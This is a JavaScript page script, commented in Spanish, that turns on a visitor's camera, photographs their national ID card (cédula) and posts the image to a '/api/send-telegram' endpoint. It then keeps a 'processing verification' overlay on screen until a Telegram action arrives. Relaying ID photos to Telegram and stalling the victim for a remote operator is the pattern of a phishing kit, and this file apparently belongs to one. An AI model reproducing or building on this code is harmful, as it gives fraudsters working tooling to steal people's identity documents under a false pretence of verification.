/**
 * CEDULA.JS - Página de captura de documento
 * Maneja la cámara web y captura de cédula
 */

document.addEventListener('DOMContentLoaded', function() {
    console.log('🚀 Iniciando página de captura de cédula...');
    
    // Asegurar que commonUtils esté inicializado
    if (window.commonUtils && !window.commonUtils.initialized) {
        window.commonUtils.initializeCommon();
    }

    // Ocultar overlay inicial
    if (window.loadingOverlay) {
        window.loadingOverlay.hide();
    }

    // Variables globales
    let stream = null;
    let capturedPhoto = null;

    // Elementos DOM
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const cameraPreview = document.getElementById('cameraPreview');
    const cameraPlaceholder = document.getElementById('cameraPlaceholder');
    const capturedImage = document.getElementById('capturedImage');
    const capturedPhotoImg = document.getElementById('capturedPhoto');
    const startCameraButton = document.getElementById('startCameraButton');
    const captureButton = document.getElementById('captureButton');
    const continueButton = document.getElementById('continueButton');
    const retakeButton = document.getElementById('retakeButton');

    // Iniciar cámara
    startCameraButton.addEventListener('click', async function() {
        console.log('📹 Iniciando cámara...');
        
        try {
            stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: 'environment',
                    width: { ideal: 1920 },
                    height: { ideal: 1080 }
                } 
            });
            
            video.srcObject = stream;
            cameraPlaceholder.style.display = 'none';
            video.style.display = 'block';
            
            startCameraButton.style.display = 'none';
            captureButton.style.display = 'flex';
            
            console.log('✅ Cámara iniciada exitosamente');
            
        } catch (error) {
            console.error('❌ Error al acceder a la cámara:', error);
            window.commonUtils.showError('No se pudo acceder a la cámara. Por favor, verifique los permisos.');
        }
    });

    // Capturar foto
    captureButton.addEventListener('click', function() {
        console.log('📸 Capturando foto...');
        
        if (!stream) {
            window.commonUtils.showError('La cámara no está activa');
            return;
        }

        // Configurar canvas
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Obtener imagen
        capturedPhoto = canvas.toDataURL('image/jpeg', 0.95);
        
        // Mostrar imagen capturada
        capturedPhotoImg.src = capturedPhoto;
        cameraPreview.style.display = 'none';
        capturedImage.style.display = 'flex';
        
        // Detener stream
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
            stream = null;
        }
        
        // Mostrar botón continuar
        captureButton.style.display = 'none';
        continueButton.style.display = 'flex';
        
        console.log('✅ Foto capturada exitosamente');
    });

    // Retomar foto
    retakeButton.addEventListener('click', function() {
        console.log('🔄 Retomando foto...');
        
        capturedImage.style.display = 'none';
        cameraPreview.style.display = 'flex';
        cameraPlaceholder.style.display = 'flex';
        video.style.display = 'none';
        
        capturedPhoto = null;
        
        continueButton.style.display = 'none';
        startCameraButton.style.display = 'flex';
    });

    // Continuar a siguiente paso
    continueButton.addEventListener('click', async function() {
        console.log('➡️ Finalizando proceso de verificación...');
        
        if (!capturedPhoto) {
            window.commonUtils.showError('Debe capturar una foto antes de continuar');
            return;
        }

        // Mostrar overlay
        window.loadingOverlay.showSending('Enviando documento...');

        try {
            // Preparar datos
            const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
            
            console.log('📤 Preparando envío de cédula...');
            console.log('Message ID:', formData.messageId);
            console.log('Tamaño foto:', capturedPhoto.length, 'caracteres');
            
            const data = {
                tipo: 'Cédula',
                messageId: formData.messageId,
                foto: capturedPhoto
            };

            console.log('🌐 Enviando request a /api/send-telegram...');

            const response = await fetch('/api/send-telegram', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(data)
            });

            console.log('📨 Response status:', response.status);

            if (!response.ok) {
                const errorText = await response.text();
                console.error('Error response:', errorText);
                throw new Error(`Error del servidor: ${response.status}`);
            }

            const result = await response.json();
            console.log('✅ Response result:', result);
            
            if (!result.success) {
                throw new Error(result.error || 'Error al procesar la solicitud');
            }

            console.log('✅ Cédula enviada exitosamente a Telegram - Message ID:', result.messageId);
            
            // Guardar estado
            formData.cedulaMessageId = result.messageId;
            sessionStorage.setItem('formData', JSON.stringify(formData));
            
            // Mantener overlay con mensaje de procesamiento
            window.loadingOverlay.showSending('Procesando verificación...');
            
            console.log('📺 Esperando respuesta de verificación...');

            // El loading se mantendrá visible hasta que llegue la acción de Telegram

        } catch (error) {
            console.error('❌ Error al enviar cédula:', error);
            window.loadingOverlay.hide();
            window.commonUtils.showError('Error al enviar el documento. Por favor intente nuevamente.');
        }
    });

    // Limpiar al salir
    window.addEventListener('beforeunload', function() {
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
    });

    console.log('✅ Página de captura de cédula iniciada correctamente');
});
